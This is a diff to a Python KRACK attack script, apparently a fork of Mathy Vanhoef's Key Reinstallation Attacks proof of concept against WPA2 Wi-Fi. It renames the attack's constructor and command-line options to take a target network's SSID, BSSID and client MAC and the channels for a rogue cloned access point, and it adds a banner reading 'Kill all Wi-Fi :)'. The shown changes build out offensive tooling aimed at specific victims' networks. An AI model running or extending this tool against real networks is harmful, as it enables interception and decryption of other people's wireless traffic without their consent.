@@ -17,6 +17,8 @@ import struct, time, argparse, heapq, subprocess, atexit, select, textwrap
 from datetime import datetime
 from wpaspy import Ctrl
 
+from utils import *
+
 # Notes:
 # - This was tested using scapy 
 # - Dependencies: python-scapy (tested using 2.3.3), libnl-3-dev, libnl-genl-3-dev, pkg-config, libssl-dev, net-tools, macchanger
@@ -38,35 +40,6 @@ from wpaspy import Ctrl
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - Prefix Warning or Error messages? What if they are just colored?
 
-IEEE_TLV_TYPE_SSID = 0
-IEEE_TLV_TYPE_CHANNEL = 3
-IEEE_TLV_TYPE_RSN = 48
-IEEE_TLV_TYPE_CSA = 37
-IEEE_TLV_TYPE_VENDOR = 221
-
-IEEE80211_RADIOTAP_RATE = (1 << 2)
-IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
-IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
-IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
-
-#### Basic output and logging functionality ####
-
-ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
-COLORCODES = {"gray": "\033[0;37m",
-              "green": "\033[0;32m",
-              "orange": "\033[0;33m",
-              "red": "\033[0;31m"}
-
-global_log_level = INFO
-
-
-def log(level, msg, color=None, showtime=True):
-    if level < global_log_level: return
-    if level == DEBUG and color is None: color = "gray"
-    if level == WARNING and color is None: color = "orange"
-    if level == ERROR and color is None: color = "red"
-    print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color,
-                                                                                              "") + msg + "\033[1;0m")
 
 #### Packet Processing Functions ####
 
@@ -497,27 +470,38 @@ class ClientState():
 
 
 class KRAckAttack():
-    def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
-        self.nic_real = nic_real
+    def __init__(self, 
+                # Wireless network interfaces:
+                 real_mon_iface, rogue_ap_iface, rogue_mon_iface, 
+                # Attack target:
+                 target_network_ssid, target_network_bssid, target_client_mac, 
+                # Specify two 2.4ghz channels to operate on:
+                 real_channel_num, rogue_channel_num, 
+                # more options:
+                 dumpfile=None, continuous_csa=False):
+        self.nic_real = real_mon_iface
         self.nic_real_clientack = None
-        self.nic_rogue_ap = nic_rogue_ap
-        self.nic_rogue_mon = nic_rogue_mon
+        self.nic_rogue_ap = rogue_ap_iface
+        self.nic_rogue_mon = rogue_mon_iface
+
+        # At least one of ssid and bssid must be specified
+        self.ssid = target_network_ssid
+        self.apmac = None if target_network_bssid is None else target_network_bssid.replace("-", ":").lower()
+        # This is set in case of targeted attacks
+        self.clientmac = None if target_client_mac is None else target_client_mac.replace("-", ":").lower()
+
         self.dumpfile = dumpfile
-        self.ssid = ssid
         self.beacon = None
-        self.apmac = None
+        
         self.netconfig = None
         self.hostapd = None
         self.hostapd_log = None
-
-        # This is set in case of targeted attacks
-        self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
 
         self.sock_real = None
         self.sock_rogue = None
         self.clients = dict()
         self.disas_queue = []
-        self.continuous_csa = cont_csa
+        self.continuous_csa = continuous_csa
 
         # To monitor wether interfaces are (still) on the proper channels
         self.last_real_beacon = None
@@ -1055,42 +1039,63 @@ def cleanup():
 
 if __name__ == "__main__":
     description = textwrap.dedent(
-        """\
+"""
         
-        █ ▗ █ ▀ ▁▁ ▊▀▀ ▀    ▉▁▁█ ▗▛▚  ▟▔▀▬ ▉ ▟▛ 
-        ▜▄▀▄▘ ▊ ▔▔ █▔▔ ▊    █▔ ▊ █▔▔▊ ▜▄▃▞ █▔▚▃ 
+ █████   ████         █████   ███   █████ ███   Kill
+░░███   ███░         ░░███   ░███  ░░███ ░░░    all
+ ░███  ███     ██████ ░███   ░███   ░███ ████   Wi-Fi
+ ░███████     ░░░░░███░███   ░███   ░███░░███   :)
+ ░███░░███     ███████░░███  █████  ███  ░███ 
+ ░███ ░░███   ███░░███ ░░░█████░█████░   ░███ 
+ █████ ░░████░░████████  ░░███ ░░███     █████
+░░░░░   ░░░░  ░░░░░░░░    ░░░   ░░░     ░░░░░ 
+
+█ ▗ █ ▀ ▁▁ ▊▀▀ ▀    ▉▁▁█ ▗▛▚  ▟▔▀▬ ▉ ▟▛ ▀ ▉▙ █ ▟▔▀▬   ▝▀▜▀▘▟▔▔▚ ▟▔▔▚ ▊   ▜▁▔▀	
+▜▄▀▄▘ ▊ ▔▔ █▔▔ ▊    █▔ ▊ █▔▔▊ ▜▄▃▞ █▔▚▃ ▊ █▝▚▊ ▜▄▞▜     █  ▜▄▃▞ ▜▄▃▞ █▃▄▖▅▁▔▟
 		
-        Based on: Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
-		-----------------------------------------------------------
-        """)
-    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
+Based on: Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
+--------------------------------------------------------------
+""")
+    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
 
     # Required arguments
-    parser.add_argument("nic_real_mon",
+    parser.add_argument("real_mon_iface",
                         help="Wireless monitor interface that will listen on the channel of the target AP.")
-    parser.add_argument("nic_rogue_ap",
+    parser.add_argument("rogue_ap_iface",
                         help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
-    parser.add_argument("ssid", help="The SSID of the network to attack.")
+    parser.add_argument("target_network_ssid", help="The SSID of the network to attack.")
+
 
     # Optional arguments
-    parser.add_argument("-m", "--nic-rogue-mon",
+    parser.add_argument("-c", "--real-channel", type=int, 
+                        help="Channel of target network to attack")
+    parser.add_argument("-C", "--rogue-channel", type=int, 
+                        help="Channel to create rogue AP")
+    parser.add_argument("-m", "--rogue-mon-iface", 
                         help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
-    parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
-    parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
-    parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
+    parser.add_argument("-t", "--target-network-bssid", 
+                        help="Specifically target the client with the given MAC address.")
+    parser.add_argument("-T", "--target-client-mac", 
+                        help="Specifically target the client with the given MAC address.")
+    parser.add_argument("-p", "--dump", 
+                        help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
+    parser.add_argument("-d", "--debug", action="count", 
+                        help="increase output verbosity", default=0)
     parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames",
                         action='store_true')
     parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)",
                         action='store_true')
     parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')
-
     args = parser.parse_args()
 
-    global_log_level = max(ALL, global_log_level - args.debug)
+    set_log_level(max(ALL, global_log_level - args.debug))
 
-    print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]===\n")
-    attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump,
-                         args.continuous_csa)
+    print(description)
+    attack = KRAckAttack(args.real_mon_iface, args.rogue_ap_iface, args.rogue_mon_iface, 
+                         args.target_network_ssid, args.target_network_bssid, args.target_client_mac,
+                         args.real_channel, args.rogue_channel,
+                         args.dump, args.continuous_csa)
+    
     atexit.register(cleanup)
     attack.run(strict_echo_test=args.strict_echo_test)
 
